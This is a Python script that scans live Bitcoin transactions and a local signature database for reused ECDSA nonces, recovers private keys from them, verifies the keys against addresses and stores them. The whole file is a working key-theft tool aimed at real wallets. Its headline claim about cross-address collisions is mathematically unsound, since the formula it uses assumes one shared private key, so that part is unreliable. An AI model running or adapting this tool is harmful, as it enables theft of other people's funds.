#!/usr/bin/env python3
"""
Cross-address R-collision solver.
Finds cases where two DIFFERENT addresses (or inputs) used the same R-value (nonce)
in their ECDSA signatures with DIFFERENT Z values, which allows private key recovery.

Also fetches and checks known collision TXes from global_vulnerabilities.txt.
"""
import os
import re
import json
import time
from collections import defaultdict
from db_manager import get_connection, add_recovered_key, add_finding, save_signatures
from lattice_nonce_analyzer import verify_key
from tx_preimage_reconstructor import extract_sigs_from_txids

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def solve_collision(r, s1, z1, s2, z2):
    """Recover private key from two signatures sharing the same R but different Z."""
    try:
        k = ((z1 - z2) * pow(s1 - s2, -1, P)) % P
        d = ((s1 * k - z1) * pow(r, -1, P)) % P
        return d, k
    except Exception as e:
        print(f"  Math error: {e}")
        return None, None

def parse_global_vulnerabilities():
    """Parse global_vulnerabilities.txt for known cross-address collision TXes."""
    path = os.path.join(os.path.dirname(__file__), 'global_vulnerabilities.txt')
    if not os.path.exists(path):
        return []
    
    results = []
    with open(path, 'r') as f:
        content = f.read()
    
    # Find all collision blocks
    blocks = content.split('Global R-Collision!')
    for block in blocks[1:]:  # Skip first empty split
        lines = block.strip().split('\n')
        r_hex = None
        entries = []
        for line in lines:
            line = line.strip()
            if line.startswith('R:'):
                r_hex = line.split('R:')[1].strip()
            elif line.startswith('Addr:'):
                match = re.match(r'Addr:\s+(\S+)\s+TX:\s+(\S+)', line)
                if match:
                    entries.append({'address': match.group(1), 'txid': match.group(2)})
        if r_hex and len(entries) >= 2:
            results.append({'r_hex': r_hex, 'entries': entries})
    
    return results

def fetch_collision_sigs(collision_txids):
    """Fetch signatures for known collision TXes and store them in DB."""
    # Get unique TXIDs
    unique_txids = list(set(collision_txids))
    print(f"Fetching sigs from {len(unique_txids)} collision TX(es)...")
    
    # We need to get ALL inputs from these TXes, not just for a specific address
    import requests
    all_sigs = []
    for txid in unique_txids:
        try:
            resp = requests.get(f"https://mempool.space/api/tx/{txid}", timeout=15)
            if resp.status_code != 200:
                print(f"  Failed to fetch TX {txid}: HTTP {resp.status_code}")
                continue
            tx_data = resp.json()
            
            for i, vin in enumerate(tx_data.get('vin', [])):
                addr = vin.get('prevout', {}).get('scriptpubkey_address', 'Unknown')
                
                # Parse DER signature
                sig_hex = vin.get('scriptsig', '')
                witness = vin.get('witness', [])
                candidates = [sig_hex] + witness
                
                for candidate in candidates:
                    if not candidate:
                        continue
                    match = re.search(r'30[0-9a-f]{2}02([0-9a-f]{2})([0-9a-f]+)02([0-9a-f]{2})([0-9a-f]+)', candidate)
                    if match:
                        r_len = int(match.group(1), 16)
                        r_val = match.group(2)[:r_len*2]
                        s_len = int(match.group(3), 16)
                        s_val = match.group(4)[:s_len*2]
                        r_int = int(r_val, 16)
                        s_int = int(s_val, 16)
                        
                        # Compute real Z
                        from tx_preimage_reconstructor import get_real_z
                        z_int = get_real_z(txid, i)
                        if z_int:
                            sig_data = {
                                'r': r_int, 's': s_int, 'z': z_int,
                                'txid': txid, 'vin': i,
                                'pubkey': '', 'address': addr
                            }
                            all_sigs.append(sig_data)
                            print(f"  Input {i} ({addr[:16]}...): R={hex(r_int)[:20]}... Z computed")
                            
                            # Save to DB
                            save_signatures(addr, [sig_data])
            time.sleep(0.2)
        except Exception as e:
            print(f"  Error fetching {txid}: {e}")
    
    return all_sigs

def find_collisions_in_sigs(sigs):
    """Find and exploit R-collisions in a list of signatures."""
    r_groups = defaultdict(list)
    for sig in sigs:
        r_hex = hex(sig['r'])[2:].zfill(64)
        r_groups[r_hex].append(sig)
    
    collision_count = 0
    recovery_count = 0
    
    for r_hex, group in r_groups.items():
        if len(group) < 2:
            continue
        
        for i in range(len(group)):
            for j in range(i + 1, len(group)):
                sig1, sig2 = group[i], group[j]
                
                if sig1['z'] == sig2['z']:
                    continue
                
                collision_count += 1
                is_cross = sig1.get('address', '') != sig2.get('address', '')
                collision_type = "CROSS-ADDRESS" if is_cross else "SAME-ADDRESS"
                
                print(f"\n{'='*60}")
                print(f"  {collision_type} R-COLLISION #{collision_count}")
                print(f"  R: {r_hex[:32]}...")
                addr1 = sig1.get('address', 'Unknown')
                addr2 = sig2.get('address', 'Unknown')
                print(f"  Sig1: {addr1} TX:{sig1['txid'][:16]}...")
                print(f"  Sig2: {addr2} TX:{sig2['txid'][:16]}...")
                
                d, k = solve_collision(sig1['r'], sig1['s'], sig1['z'], sig2['s'], sig2['z'])
                if d is None:
                    print("  FAILED: Could not solve")
                    continue
                
                d_hex = hex(d)[2:].zfill(64)
                print(f"  Recovered key: {d_hex[:20]}...")
                
                addresses = list(set([addr1, addr2]))
                for addr in addresses:
                    if addr == 'Unknown':
                        continue
                    if verify_key(d, addr):
                        print(f"  KEY VERIFIED for {addr}")
                        add_recovered_key(addr, d_hex, method=f'{collision_type} R-Collision')
                        add_finding(addr, f'{collision_type} R-Collision (Solved)',
                                   txid=sig1['txid'],
                                   details=json.dumps({
                                       'r': r_hex,
                                       'other_address': addr2 if addr == addr1 else addr1,
                                       'privkey': d_hex
                                   }),
                                   severity='Critical')
                        recovery_count += 1
                    else:
                        print(f"  Key does NOT match {addr}")
    
    return collision_count, recovery_count

def run():
    total_collisions = 0
    total_recoveries = 0
    
    # Step 1: Check known collisions from global_vulnerabilities.txt
    known = parse_global_vulnerabilities()
    if known:
        print(f"Found {len(known)} known collision(s) in global_vulnerabilities.txt")
        all_txids = []
        for coll in known:
            for entry in coll['entries']:
                all_txids.append(entry['txid'])
        
        fetched_sigs = fetch_collision_sigs(all_txids)
        if fetched_sigs:
            c, r = find_collisions_in_sigs(fetched_sigs)
            total_collisions += c
            total_recoveries += r
    
    # Step 2: Check existing signatures in DB
    print(f"\nChecking existing signatures in DB...")
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT address, txid, vin, r_hex, s_hex, z_hex, r_int, s_int, z_int
        FROM signatures
        WHERE r_int IS NOT NULL AND s_int IS NOT NULL AND z_int IS NOT NULL
    """)
    rows = cursor.fetchall()
    conn.close()
    
    db_sigs = []
    for row in rows:
        address, txid, vin, r_hex, s_hex, z_hex, r_int, s_int, z_int = row
        db_sigs.append({
            'address': address,
            'txid': txid,
            'vin': vin,
            'r': int(r_int),
            's': int(s_int),
            'z': int(z_int)
        })
    
    print(f"Loaded {len(db_sigs)} signatures from DB.")
    c, r = find_collisions_in_sigs(db_sigs)
    total_collisions += c
    total_recoveries += r
    
    print(f"\n{'='*60}")
    print(f"TOTAL: {total_collisions} collision(s) with different Z, {total_recoveries} key(s) recovered.")

if __name__ == "__main__":
    run()
